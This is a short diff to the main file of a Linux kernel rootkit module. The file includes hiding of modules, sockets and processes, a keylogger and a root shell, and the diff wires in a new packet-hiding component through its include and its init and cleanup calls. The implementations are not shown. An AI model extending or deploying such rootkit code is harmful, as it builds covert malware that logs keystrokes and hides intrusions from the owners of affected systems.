@@ -8,6 +8,7 @@
 #include "module_hiding.h"
 #include "socket_hiding.h"
 #include "process_hiding.h"
+#include "packet_hiding.h"
 #include "keylogger.h"
 #include "rootshell.h"
 
@@ -76,6 +77,7 @@ int __init init(void)
 	init_process_hiding();
 	init_module_hiding();
 	init_keylogger();
+	init_packet_hiding();
 
 	// Hide our module
 	// hide_module(&__this_module);
@@ -97,6 +99,7 @@ void __exit cleanup(void)
 	finalize_process_hiding();
 	finalize_module_hiding();
 	finalize_keylogger();
+	finalize_packet_hiding();
 }
 
 module_init(init);
